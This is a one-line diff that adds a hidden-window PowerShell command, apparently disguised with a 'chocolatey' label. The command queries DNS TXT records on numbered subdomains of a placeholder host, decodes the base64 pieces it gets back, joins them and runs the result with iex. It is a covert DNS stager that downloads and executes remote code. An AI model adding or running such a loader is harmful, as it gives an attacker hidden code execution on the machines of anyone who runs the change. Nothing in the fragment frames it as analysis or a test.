@@ -1,0 +1,1 @@
+powershell -windowstyle hidden "$temp1 = 'chocolatey'; $str = ''; $i = 1; while (1) { if ('' + (nslookup -q=txt -timeout=5 ('ini.'+$i+'.test.example.com') 2>&1) -match '@(.*)@') { $str += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1])); } else { break; } $i++;}; iex $str;"
